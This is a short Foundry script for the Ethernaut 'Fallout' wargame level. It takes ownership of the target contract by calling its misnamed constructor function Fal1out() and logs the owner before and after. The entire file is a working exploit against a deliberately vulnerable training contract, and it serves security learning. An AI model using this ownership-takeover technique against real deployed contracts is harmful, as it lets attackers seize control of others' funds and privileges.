// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/02_fallout.sol";

contract AttackerFalloutScript is Script {
    Fallout fallout = Fallout(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        console.log("Current Owner is : ", fallout.owner());
        fallout.Fal1out();
        console.log("New Owner is : ", fallout.owner());

        vm.stopBroadcast();
    }
}
